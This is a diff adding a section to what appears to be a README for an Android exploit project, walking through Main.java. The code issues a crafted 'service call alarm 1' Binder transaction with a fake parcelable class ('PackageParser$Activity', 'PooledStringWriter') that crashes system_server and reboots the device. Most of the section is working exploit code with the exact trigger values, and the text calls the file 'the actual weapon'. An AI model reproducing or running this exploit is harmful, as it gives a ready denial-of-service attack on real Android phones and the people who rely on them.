@@ -54,6 +54,92 @@ So in total:
 That’s it. The whole attack starts with this tiny button!
 
 
+### `Main.java` 
+
+This is the **real brain** of the exploit. It contains the exact payload that crashes `system_server`.
+
+```java
+public static class AlarmConfig {
+```
+A small helper class that holds all the numbers and strings we need to send.
+
+```java
+public int callingPackage = -1;
+public int type = 0;
+public long triggerAtTime = 0;
+// ... many more zeros and -1 ...
+public int alarmClock = 1;                    // ← super important: tells Android we have AlarmClockInfo
+public String parcelableClass = "android.content.pm.PackageParser$Activity";
+public int intentCount = 1;
+public String pooledStringClass = "android.os.PooledStringWriter";
+public int padding = 0;
+```
+These are the exact values that make the crash happen.  
+Changing most of them breaks the exploit.
+
+```java
+public static boolean setAlarm(AlarmConfig config) {
+```
+This function builds and runs the real command.
+
+```java
+String[] command = {
+    "service", "call", "alarm", "1",          // talk to AlarmManager, transaction 1
+    "i32", "-1",                              // fake calling package
+    // ... all the normal alarm fields (mostly 0 and -1) ...
+    "i32", "1",                               // ← AlarmClockInfo is present
+    "s16", "android.content.pm.PackageParser$Activity",  // ← lie: this is not an Intent!
+    "i32", "-1", "i32", "-1",                 // fake fields
+    "i32", "1",                               // one fake intent
+    "s16", "android.os.PooledStringWriter",  // ← this class will kill the system
+    "i32", "0"                                // padding
+};
+```
+This long list becomes exactly the same as typing this in a terminal:
+```
+service call alarm 1 i32 -1 ... s16 "android.content.pm.PackageParser\$Activity" ...
+```
+
+```java
+ProcessBuilder pb = new ProcessBuilder(command);
+Process process = pb.start();
+```
+Runs the command inside Android (no need for ADB).
+
+```java
+int exitCode = process.waitFor();
+```
+Waits for the command to finish.  
+On crash it usually returns a weird number or just hangs.
+
+```java
+public static void crashSystemServer() {
+    AlarmConfig config = new AlarmConfig();
+    setAlarm(config);        // ← one call = one system_server crash
+}
+```
+The only public function you call from the button or background runner.  
+One line → `system_server` dies.
+
+```java
+public static void main(String[] args) {
+    crashSystemServer();     // you can also run the app as a Java program to test
+}
+```
+
+### Summary – What `Main.java` Actually Does
+
+| Part                         | What it really means                                  |
+|------------------------------|--------------------------------------------------------|
+| `AlarmConfig`                | Stores the exact magic numbers and fake class names   |
+| `setAlarm()`                 | Builds and runs the `service call alarm 1 …` command   |
+| `crashSystemServer()`        | One-line function that kills `system_server`          |
+
+That’s it.  
+Everything else (button, background runner) just calls `Main.crashSystemServer()` — this file is the actual weapon.
+
+
+
 ### `RebootBackgroundRunner.java` 
 
 ```java
